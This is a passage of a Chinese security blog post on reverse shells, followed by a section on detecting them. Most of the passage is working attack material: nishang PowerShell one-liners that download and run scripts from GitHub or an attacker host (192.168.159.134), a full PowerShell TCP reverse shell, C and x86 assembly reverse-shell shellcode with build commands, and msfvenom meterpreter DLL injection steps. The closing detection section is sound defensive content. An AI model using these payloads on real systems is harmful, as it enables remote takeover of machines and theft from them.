+<h4 id="2）nishang反弹shell"><a href="#2）nishang反弹shell" class="headerlink" title="2）nishang反弹shell"></a>2）nishang反弹shell</h4><p>Nishang是一个基于PowerShell的攻击框架，集合了一些PowerShell攻击脚本和有效载荷，可反弹TCP&#x2F; UDP&#x2F; HTTP&#x2F;HTTPS&#x2F; ICMP等类型shell。</p>
+<p><strong>## Reverse TCP shell</strong></p>
+<p><a href="javascript:void(0);"><img src="https://common.cnblogs.com/images/copycode.gif" srcset="/img/loading.gif" lazyload alt="复制代码"></a></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># 攻击者(192.168.159.134)开启监听：</span><br>nc <span class="hljs-literal">-lvp</span> <span class="hljs-number">6666</span><br><br><span class="hljs-comment"># 目标机执行：</span><br>powershell <span class="hljs-built_in">IEX</span> (<span class="hljs-built_in">New-Object</span> Net.WebClient).DownloadString(<span class="hljs-string">&#x27;https://raw.githubusercontent.com</span><br><span class="hljs-string">/samratashok/nishang/9a3c747bcf535ef82dc4c5c66aac36db47c2afde/Shells/Invoke-PowerShellTcp.ps1&#x27;</span>);<br><span class="hljs-built_in">Invoke-PowerShellTcp</span> <span class="hljs-literal">-Reverse</span> <span class="hljs-literal">-IPAddress</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">159.134</span> <span class="hljs-literal">-port</span> <span class="hljs-number">6666</span><br><br><span class="hljs-comment"># 或者将nishang下载到攻击者本地：</span><br>powershell <span class="hljs-built_in">IEX</span> (<span class="hljs-built_in">New-Object</span> Net.WebClient).DownloadString(<span class="hljs-string">&#x27;http://192.168.159.134/nishang/Shells/Invoke-PowerShellTcp.ps1&#x27;</span>);<span class="hljs-built_in">Invoke-PowerShellTcp</span> <span class="hljs-literal">-Reverse</span> <span class="hljs-literal">-IPAddress</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">159.134</span> <span class="hljs-literal">-port</span> <span class="hljs-number">6666</span><br></code></pre></td></tr></table></figure>
+
+<p><a href="javascript:void(0);"><img src="https://common.cnblogs.com/images/copycode.gif" srcset="/img/loading.gif" lazyload alt="复制代码"></a></p>
+<p><strong>## Reverse UDP shell</strong></p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># 攻击者(192.168.159.134)开启监听：</span><br><span class="hljs-attribute">nc</span> -lvup <span class="hljs-number">53</span><br><br><span class="hljs-comment"># 目标机执行：</span><br><span class="hljs-attribute">powershell</span> IEX (New-Object Net.WebClient).DownloadString(&#x27;http://<span class="hljs-number">192.168.159.134</span>/nishang/Shells/Invoke-PowerShellUdp.ps1&#x27;);<br><span class="hljs-attribute">Invoke</span>-PowerShellUdp -Reverse -IPAddress <span class="hljs-number">192.168.159.134</span> -port <span class="hljs-number">53</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>## Reverse ICMP shell</strong></p>
+<p><a href="javascript:void(0);"><img src="https://common.cnblogs.com/images/copycode.gif" srcset="/img/loading.gif" lazyload alt="复制代码"></a></p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-comment"># 首先攻击端下载icmpsh_m.py文件</span><br>https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/inquisb/i</span>cmpsh)和nishang中的Invoke-PowerShellIcmp.ps1<br><br><span class="hljs-comment"># 攻击者(192.168.159.134)执行</span><br>sysctl -w net.ipv4.icmp_echo_ignore_all=<span class="hljs-number">1</span> <span class="hljs-comment">#忽略所有icmp包</span><br>python icmpsh_m.py <span class="hljs-number">192.168</span>.<span class="hljs-number">159.134</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">159.138</span> <span class="hljs-comment">#开启监听</span><br><br><span class="hljs-comment"># 目标机(192.168.159.138)执行</span><br>powershell IEX (New-Object Net.WebClient).DownloadString(<span class="hljs-string">&#x27;http://192.168.159.134/nishang/Shells/Invoke-PowerShellIcmp.ps1&#x27;</span>);Invoke-PowerShellIcmp -IPAddress <span class="hljs-number">192.168</span>.<span class="hljs-number">159.134</span><br></code></pre></td></tr></table></figure>
+
+<p><a href="javascript:void(0);"><img src="https://common.cnblogs.com/images/copycode.gif" srcset="/img/loading.gif" lazyload alt="复制代码"></a></p>
+<h4 id="3）自定义powershell函数反弹shell"><a href="#3）自定义powershell函数反弹shell" class="headerlink" title="3）自定义powershell函数反弹shell"></a>3）自定义powershell函数反弹shell</h4><p>利用powershell创建一个Net.Sockets.TCPClient对象，通过Socket反弹tcp shell。</p>
+<p><a href="javascript:void(0);"><img src="https://common.cnblogs.com/images/copycode.gif" srcset="/img/loading.gif" lazyload alt="复制代码"></a></p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-comment"># 攻击者(192.168.159.134) 开启监听 </span><br>nc -lvp <span class="hljs-number">6666</span><br><br><span class="hljs-comment"># 目标机执行 </span><br>powershell -nop -c <span class="hljs-string">&quot;$client = New-Object Net.Sockets.TCPClient(&#x27;192.168.159.134&#x27;,6666);$stream = $client.GetStream();</span><br><span class="hljs-string">[byte[]]$bytes = 0..65535|%&#123;0&#125;;while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)&#123;;</span><br><span class="hljs-string">$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );</span><br><span class="hljs-string">$sendback2 = $sendback + &#x27;PS &#x27; + (pwd).Path + &#x27;&gt; &#x27;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);</span><br><span class="hljs-string">$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()&#125;;$client.Close()&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p><a href="javascript:void(0);"><img src="https://common.cnblogs.com/images/copycode.gif" srcset="/img/loading.gif" lazyload alt="复制代码"></a></p>
+<h4 id="4）Empire-结合office反弹shell"><a href="#4）Empire-结合office反弹shell" class="headerlink" title="4）Empire 结合office反弹shell"></a>4）Empire 结合office反弹shell</h4><p>Empire(<a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/EmpireProject/Empire)%E5%9F%BA%E4%BA%8Epowershell%E7%9A%84%E5%90%8E%E6%B8%97%E9%80%8F%E6%94%BB%E5%87%BB%E6%A1%86%E6%9E%B6%EF%BC%8C%E5%8F%AF%E5%88%A9%E7%94%A8office%E5%AE%8F%E3%80%81OLE%E5%AF%B9%E8%B1%A1%E6%8F%92%E5%85%A5%E6%89%B9%E5%A4%84%E7%90%86%E6%96%87%E4%BB%B6%E3%80%81HTML%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F(HTAs)%E7%AD%89%E8%BF%9B%E8%A1%8C%E5%8F%8D%E5%BC%B9shell%E3%80%82">https://github.com/EmpireProject/Empire)基于powershell的后渗透攻击框架，可利用office宏、OLE对象插入批处理文件、HTML应用程序(HTAs)等进行反弹shell。</a></p>
+<ul>
+<li>利用office宏反弹shell </li>
+<li>利用office OLE对象插入bat文件反弹shell</li>
+</ul>
+<p><strong>Relevant Link:</strong> </p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.anquanke.com<span class="hljs-regexp">/post/i</span>d/<span class="hljs-number">99793</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="10-regsvr32反弹shell"><a href="#10-regsvr32反弹shell" class="headerlink" title="10. regsvr32反弹shell"></a>10. regsvr32反弹shell</h3><h2 id="0x5：msf生成payload反弹shell"><a href="#0x5：msf生成payload反弹shell" class="headerlink" title="0x5：msf生成payload反弹shell"></a>0x5：msf生成payload反弹shell</h2><h3 id="1-生成脚本解释型代码并执行"><a href="#1-生成脚本解释型代码并执行" class="headerlink" title="1. 生成脚本解释型代码并执行"></a>1. 生成脚本解释型代码并执行</h3><p>本质上就是在目标机器执行了一段Python代码，和上一章节的python反弹shell没有本质区别。</p>
+<h3 id="2-生成编译型二进制文件并执行"><a href="#2-生成编译型二进制文件并执行" class="headerlink" title="2. 生成编译型二进制文件并执行"></a>2. 生成编译型二进制文件并执行</h3><p>本质上就是在目标机器执行了一个二进制程序。</p>
+<h3 id="3-内存shellcode执行"><a href="#3-内存shellcode执行" class="headerlink" title="3. 内存shellcode执行"></a>3. 内存shellcode执行</h3><p>通过shellcode直接调用glibc或者syscall完成反弹shell。 </p>
+<h4 id="1）C代码"><a href="#1）C代码" class="headerlink" title="1）C代码"></a>1）C代码</h4><p><a href="javascript:void(0);"><img src="https://common.cnblogs.com/images/copycode.gif" srcset="/img/loading.gif" lazyload alt="复制代码"></a></p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;sys/socket.h&gt;</span>   <span class="hljs-comment">//构造socket所需的库</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;netinet/in.h&gt;</span>  <span class="hljs-comment">//定义sockaddr结构</span></span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-type">char</span> *shell[<span class="hljs-number">2</span>];       <span class="hljs-comment">//用于execv调用</span><br>  <span class="hljs-type">int</span> soc,remote;    <span class="hljs-comment">//文件描述符句柄</span><br>  <span class="hljs-keyword">struct</span> <span class="hljs-title class_">sockaddr_in</span> serv_addr; <span class="hljs-comment">//保存IP/端口值的结构</span><br> <br>  serv_addr.sin_addr.s_addr=<span class="hljs-number">0x6400A8C0</span>;  <span class="hljs-comment">//将socket的地址设置为所有本地地址</span><br>  serv_addr.sin_port=<span class="hljs-number">0xBBBB</span>;  <span class="hljs-comment">//设置socket的端口48059</span><br>  serv_addr.sin_family=<span class="hljs-number">2</span>;   <span class="hljs-comment">//设置协议族：IP</span><br>  soc=<span class="hljs-built_in">socket</span>(<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>);<br>  remote=<span class="hljs-built_in">connect</span>(soc,(<span class="hljs-keyword">struct</span> sockaddr *)&amp;serv_addr,<span class="hljs-number">0x10</span>);<br> <br>  <span class="hljs-built_in">dup2</span>(soc,<span class="hljs-number">0</span>);   <span class="hljs-comment">//将stdin连接client</span><br>  <span class="hljs-built_in">dup2</span>(soc,<span class="hljs-number">1</span>);   <span class="hljs-comment">//将stdout连接client</span><br>  <span class="hljs-built_in">dup2</span>(soc,<span class="hljs-number">2</span>);   <span class="hljs-comment">//将strderr连接到client</span><br>  shell[<span class="hljs-number">0</span>]=<span class="hljs-string">&quot;/bin/sh&quot;</span>;   <span class="hljs-comment">//execve的第一个参数</span><br>  shell[<span class="hljs-number">1</span>]=<span class="hljs-number">0</span>;           <span class="hljs-comment">//数组的第二个元素为NULL,表示数组结束</span><br>  <span class="hljs-built_in">execv</span>(shell[<span class="hljs-number">0</span>],shell,<span class="hljs-literal">NULL</span>);   <span class="hljs-comment">//建立一个shell</span><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><a href="javascript:void(0);"><img src="https://common.cnblogs.com/images/copycode.gif" srcset="/img/loading.gif" lazyload alt="复制代码"></a></p>
+<h4 id="2）汇编语言代码"><a href="#2）汇编语言代码" class="headerlink" title="2）汇编语言代码"></a>2）汇编语言代码</h4><p><a href="javascript:void(0);"><img src="https://common.cnblogs.com/images/copycode.gif" srcset="/img/loading.gif" lazyload alt="复制代码"></a></p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">section</span> .text<br><span class="hljs-meta">global</span> _start<br><span class="hljs-symbol">_start:</span><br><span class="hljs-keyword">xor</span> <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">eax</span> <span class="hljs-comment">;清空eax</span><br><span class="hljs-keyword">xor</span> <span class="hljs-built_in">ebx</span>,<span class="hljs-built_in">ebx</span> <span class="hljs-comment">;清空ebx</span><br><span class="hljs-keyword">xor</span> <span class="hljs-built_in">edx</span>,<span class="hljs-built_in">edx</span>  <span class="hljs-comment">;清空edx</span><br> <br><span class="hljs-comment">;soc=socket(2,1,0)</span><br><span class="hljs-keyword">push</span> <span class="hljs-built_in">eax</span>  <span class="hljs-comment">;socket的第三个参数：0</span><br><span class="hljs-keyword">push</span> <span class="hljs-built_in">byte</span> <span class="hljs-number">0x1</span> <span class="hljs-comment">;socket的第二个参数：1</span><br><span class="hljs-keyword">push</span> <span class="hljs-built_in">byte</span> <span class="hljs-number">0x2</span> <span class="hljs-comment">;socket的第一个参数：2</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">ecx</span>,<span class="hljs-built_in">esp</span> <span class="hljs-comment">;将数组的地址设置为socketcall的第二个参数</span><br><span class="hljs-keyword">inc</span> <span class="hljs-built_in">bl</span>  <span class="hljs-comment">;将socketcall的第一个参数设置为1</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">al</span>,<span class="hljs-number">102</span>  <span class="hljs-comment">;调用socketcall,分支调用号为1：SYS_SOCKET</span><br><span class="hljs-keyword">int</span> <span class="hljs-number">0x80</span>  <span class="hljs-comment">;进入核心态，执行系统调用</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">esi</span>,<span class="hljs-built_in">eax</span> <span class="hljs-comment">;将返回值(eax)存储到esi中（即soc句柄）</span><br> <br><span class="hljs-comment">;remote=connect(soc,(struct sockaddr *)&amp;serv_addr,0x10)</span><br><span class="hljs-keyword">push</span> <span class="hljs-built_in">edx</span><span class="hljs-comment">; ;仍然为0，用来作为接下来压栈的数据的结束符</span><br><span class="hljs-keyword">push</span> long <span class="hljs-number">0x6400A8C0</span>  <span class="hljs-comment">;本节代码中新增，将地址反序得到的十六进制压栈</span><br><span class="hljs-keyword">push</span> <span class="hljs-built_in">word</span> <span class="hljs-number">0xBBBB</span>  <span class="hljs-comment">;将端口压栈，十进制为48059</span><br><span class="hljs-keyword">xor</span> <span class="hljs-built_in">ecx</span>,<span class="hljs-built_in">ecx</span> <span class="hljs-comment">;清空ecx，以便保存结构的sa_family字段</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">cl</span>,<span class="hljs-number">2</span>  <span class="hljs-comment">;将ecx的地位字节，设置为2</span><br><span class="hljs-keyword">push</span> <span class="hljs-built_in">word</span> <span class="hljs-built_in">cx</span>  <span class="hljs-comment">;建立结构，包括端口和sin.family,共四个字节</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">ecx</span>,<span class="hljs-built_in">esp</span> <span class="hljs-comment">;将结构的地址（在栈上）复制到ecx</span><br><span class="hljs-keyword">push</span> <span class="hljs-built_in">byte</span> <span class="hljs-number">0x10</span>  <span class="hljs-comment">;connect参数的开始，将16压栈</span><br><span class="hljs-keyword">push</span> <span class="hljs-built_in">ecx</span>  <span class="hljs-comment">;在栈上保存结构的地址</span><br><span class="hljs-keyword">push</span> <span class="hljs-built_in">esi</span>  <span class="hljs-comment">;将服务器文件描述符esi保存到栈</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">ecx</span>,<span class="hljs-built_in">esp</span> <span class="hljs-comment">;将参数数组的地址保存到ecx（socketcall的第二个参数）</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">bl</span>,<span class="hljs-number">3</span>  <span class="hljs-comment">;将bl设置为3，socketcall的第一个参数</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">al</span>,<span class="hljs-number">102</span>  <span class="hljs-comment">;调用socketcall，分支调用号为3：SYS_CONNECT</span><br><span class="hljs-keyword">int</span> <span class="hljs-number">0x80</span>  <span class="hljs-comment">;进入核心态，执行系统调用</span><br> <br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">ebx</span>,<span class="hljs-built_in">esi</span> <span class="hljs-comment">;将客户端的soc文件描述符复制到ebx</span><br><span class="hljs-comment">;dup2(soc,0)</span><br><span class="hljs-keyword">xor</span> <span class="hljs-built_in">ecx</span>,<span class="hljs-built_in">ecx</span> <span class="hljs-comment">;清空ecx</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">al</span>,<span class="hljs-number">63</span> <span class="hljs-comment">;将系统调用的第一个参数设置为63：dup</span><br><span class="hljs-keyword">int</span> <span class="hljs-number">0x80</span>  <span class="hljs-comment">;进行系统调用</span><br> <br><span class="hljs-comment">;dup2(client,1)</span><br><span class="hljs-keyword">inc</span> <span class="hljs-built_in">ecx</span> <span class="hljs-comment">;ecx设置为1</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">al</span>,<span class="hljs-number">63</span> <span class="hljs-comment">;准备进行系统调用:dup2:63</span><br><span class="hljs-keyword">int</span> <span class="hljs-number">0x80</span>  <span class="hljs-comment">;进行系统调用</span><br> <br><span class="hljs-comment">;dup2(client,2)</span><br><span class="hljs-keyword">inc</span> <span class="hljs-built_in">ecx</span> <span class="hljs-comment">;ecx设置为2</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">al</span>,<span class="hljs-number">63</span> <span class="hljs-comment">;准备进行系统调用:dup2:63</span><br><span class="hljs-keyword">int</span> <span class="hljs-number">0x80</span> <span class="hljs-comment">;进行系统调用</span><br> <br><span class="hljs-comment">;标准的execv(&quot;/bin/sh&quot;...</span><br><span class="hljs-keyword">push</span> <span class="hljs-built_in">edx</span><br><span class="hljs-keyword">push</span> long <span class="hljs-number">0x68732f2f</span><br><span class="hljs-keyword">push</span> long <span class="hljs-number">0x6e69622f</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">ebx</span>,<span class="hljs-built_in">esp</span><br><span class="hljs-keyword">push</span> <span class="hljs-built_in">edx</span><br><span class="hljs-keyword">push</span> <span class="hljs-built_in">ebx</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">ecx</span>,<span class="hljs-built_in">esp</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">al</span>,<span class="hljs-number">0x0b</span><br><span class="hljs-keyword">int</span> <span class="hljs-number">0x80</span><br></code></pre></td></tr></table></figure>
+
+<p><a href="javascript:void(0);"><img src="https://common.cnblogs.com/images/copycode.gif" srcset="/img/loading.gif" lazyload alt="复制代码"></a></p>
+<p>注意，push long 0x6400A8C0 这里就是IP地址，出现了00，在网络传输中会被截断。</p>
+<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs avrasm">nasm -f elf reverse_port_asm.asm<br><span class="hljs-keyword">ld</span> -o reverse_port_asm reverse_port_asm.o<br><span class="hljs-meta"># 然后抽取十六进制代码</span><br>objdump -d ./reverse_port_asm<br><span class="hljs-meta"># 得到shellcode </span><br></code></pre></td></tr></table></figure>
+
+<h3 id="4-通过dll进程注入执行反弹shell"><a href="#4-通过dll进程注入执行反弹shell" class="headerlink" title="4. 通过dll进程注入执行反弹shell"></a>4. 通过dll进程注入执行反弹shell</h3><p>PowerSploit是又一款基于powershell的后渗透攻击框架。PowerSploit包括Inject-Dll(注入dll到指定进程)、Inject-Shellcode（注入shellcode到执行进程）等功能。<br>利用msfvenom、metasploit和PowerSploit中的Invoke-DllInjection.ps1 实现dll注入，反弹shell、</p>
+<ul>
+<li>msfvenom生成dll后门：msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;192.168.159.134 lport&#x3D;6667 -f dll -o &#x2F;var&#x2F;www&#x2F;html&#x2F;PowerSploit&#x2F;lltest.dll</li>
+<li>metasploit设置payload开启监听</li>
+<li>powershell下载PowerSploit中Invoke-DllInjection.ps1和msfvenom生成的dll后门：IEX (New-Object Net.WebClient).DownloadString(“<a target="_blank" rel="external nofollow noopener noreferrer" href="http://192.168.159.134/PowerSploit/CodeExecution/Invoke-DllInjection.ps1&quot;)Invoke-DllInjection">http://192.168.159.134/PowerSploit/CodeExecution/Invoke-DllInjection.ps1&quot;)Invoke-DllInjection</a> -ProcessID 5816 -Dll C:UsersAdministratorDesktoplltest.dll</li>
+</ul>
+<p>本质上，dll进程注入和上一节介绍的shellcode执行的原理的是一样的。</p>
+<h2 id="0x6：dns-shell-amp-icmp-shell"><a href="#0x6：dns-shell-amp-icmp-shell" class="headerlink" title="0x6：dns_shell &amp; icmp_shell"></a>0x6：dns_shell &amp; icmp_shell</h2><p>本质上说，dns和icmp是一种网络通信方式，使用任何语言都可以借助这两种网络通信方式进行反弹shell交互。</p>
+<p>但是我们知道，dns和icmp和tcp&#x2F;udp不一样，它们都不是直连的网络信道，而是需要通过一个第三方进行消息中转。</p>
+<ul>
+<li>dns（udp直连模式）<ul>
+<li>control server将指令封装成dns包格式，通过udp53直接发送给client</li>
+<li>victim client从udp53接收到dns包后进行解析，从中提取并解码得到指令，并将执行结果封装成dns包格式，通过udp53返回给server</li>
+</ul>
+</li>
+<li>dns（authoritative DNS server转发模式）<ul>
+<li>victim client配置好dns resolve（domain nameserver），之后将所有的执行结果和指令请求都以正常dns query的形式发送给local DNS server，随后通过dns递归查询最终会发送到攻击者控制的domain nameserver上</li>
+<li>control server从dns query中过滤出反弹shell相关的会话通信，并按照dns response的形式返回主控指令。</li>
+</ul>
+</li>
+</ul>
+<p><strong>Relevant Link:</strong> </p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>xz.aliyun.com<span class="hljs-regexp">/t/</span><span class="hljs-number">2549</span><br>https:<span class="hljs-regexp">//</span>www.cnblogs.com<span class="hljs-regexp">/r00tgrok/</span>p/reverse_shell_cheatsheet.html<br>https:<span class="hljs-regexp">//</span>www.cnblogs.com<span class="hljs-regexp">/shanmao/</span>archive<span class="hljs-regexp">/2012/</span><span class="hljs-number">12</span><span class="hljs-regexp">/26/</span><span class="hljs-number">2834210</span>.html<br>https:<span class="hljs-regexp">//</span>xz.aliyun.com<span class="hljs-regexp">/t/</span><span class="hljs-number">6727</span><br></code></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.cnblogs.com/LittleHann/p/12038070.html#_labelTop">回到顶部(go to top)</a></p>
+<h1 id="5-反弹Shell检测思路"><a href="#5-反弹Shell检测思路" class="headerlink" title="5. 反弹Shell检测思路"></a>5. 反弹Shell检测思路</h1><h2 id="1-进程-file-descriptor-异常检测"><a href="#1-进程-file-descriptor-异常检测" class="headerlink" title="1.进程 file descriptor 异常检测"></a>1.进程 file descriptor 异常检测</h2><h3 id="1-1-检测-file-descriptor-是否指向一个socket"><a href="#1-1-检测-file-descriptor-是否指向一个socket" class="headerlink" title="1.1 检测 file descriptor 是否指向一个socket"></a>1.1 检测 file descriptor 是否指向一个socket</h3><p>以“重定向符”+”&#x2F;dev&#x2F;tcp网络通信”Bash反弹Shell这一类最经典的反弹Shell攻击方式为例，这类反弹shell的本质可以归纳为<strong>file descriptor的重定向到一个socket句柄</strong>。</p>
+<p><img src="https://img2018.cnblogs.com/blog/532548/201912/532548-20191215104034125-1531808234.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p> <img src="https://img2018.cnblogs.com/blog/532548/201912/532548-20191215104112969-1097291178.png" srcset="/img/loading.gif" lazyload alt="img"> </p>
+<h3 id="1-2-检测-file-descriptor-是否指向一个管道符（pipe）"><a href="#1-2-检测-file-descriptor-是否指向一个管道符（pipe）" class="headerlink" title="1.2 检测 file descriptor 是否指向一个管道符（pipe）"></a>1.2 检测 file descriptor 是否指向一个管道符（pipe）</h3><p>对于利用“管道符”传递指令的反弹shell攻击方式来说，这类反弹shell的本质可以归纳为<strong>file descriptor的重定向到一个pipe句柄</strong>。</p>
+<p><img src="https://img2018.cnblogs.com/blog/532548/201912/532548-20191215105358151-246000034.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>更进一步地说，不管做了多少层的pipe，反弹shell的本质是将server的输入传递给client的bash，因此肯定存在socket连接。</p>
+<p>我们只需要根据pid追溯pipe上游的进程，并判断其进程fd，检查是否是来自一个socket。</p>
+<p>例如，跟踪pipe，发现pipe的进程建立了socket连接，那么就存在反弹shell的风险。 </p>
+<h2 id="2-netlink监控-fd异常检测"><a href="#2-netlink监控-fd异常检测" class="headerlink" title="2.netlink监控+fd异常检测"></a>2.netlink监控+fd异常检测</h2><ul>
+<li>监听Netlink Socket，实时获取进程EXEC事件。</li>
+<li>如果为Shell进程，检查进程启动打开的FD，<ul>
+<li>打开了Socket</li>
+<li>未使用&#x2F;dev&#x2F;tty、&#x2F;dev&#x2F;pts&#x2F;n、&#x2F;dev&#x2F;ptmx等终端</li>
+<li>则确认为反弹Shell</li>
+</ul>
+</li>
+</ul>
+<p><strong>绕过风险：仅能通过进程执行文件名判断是否为Shell进程，上传可执行文件、拷贝Bash文件到其他路径等方法会绕过这个方法</strong>。</p>
+<p>例如通过将&#x2F;bin&#x2F;sh重命名为其他名字进行反弹shell。</p>
+<h2 id="3-脚本文件-amp-amp-应用程序-amp-amp-无文件（fileless）反弹shell检测"><a href="#3-脚本文件-amp-amp-应用程序-amp-amp-无文件（fileless）反弹shell检测" class="headerlink" title="3.脚本文件 &amp;&amp; 应用程序 &amp;&amp; 无文件（fileless）反弹shell检测"></a>3.脚本文件 &amp;&amp; 应用程序 &amp;&amp; 无文件（fileless）反弹shell检测</h2><p>需要注意的是，操作系统是分层的，Bash只是一个应用程序的普通应用，其内部封装了调用glibc execve的功能而已，除了bash之外，白帽子还可以基于任意的应用层技术来实现反弹shell，例如：</p>
+<ul>
+<li>python&#x2F;perl实现纯代码形式的反弹shell文件执行：文件脚本检测</li>
+<li>python&#x2F;perl实现纯代码形式的反弹shell命令行指令（fileless）：纯命令行fileless检测</li>
+<li>C&#x2F;C++实现纯代码形式的反弹shell：二进制文件检测</li>
+</ul>
+<h2 id="4-特征检测"><a href="#4-特征检测" class="headerlink" title="4. 特征检测"></a>4. 特征检测</h2><h4 id="4-1网络层反弹shell通信特征检测"><a href="#4-1网络层反弹shell通信特征检测" class="headerlink" title="4.1网络层反弹shell通信特征检测"></a>4.1网络层反弹shell通信特征检测</h4><p>反弹shell的通信会话中，会包含一些”cmdline shell特征“，例如”#root….“等，可以在网络侧进行NTA实时检测。</p>
+<h4 id="4-2DNS反弹shell特征检测"><a href="#4-2DNS反弹shell特征检测" class="headerlink" title="4.2DNS反弹shell特征检测"></a>4.2DNS反弹shell特征检测</h4><p>针对DNS流量进行分析，判断关联进程是否开启&#x2F;dev&#x2F;net&#x2F;tun，或者&#x2F;dev&#x2F;net&#x2F;tap隧道等等。</p>
+
+                
+              </div>
+            
+            <hr>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
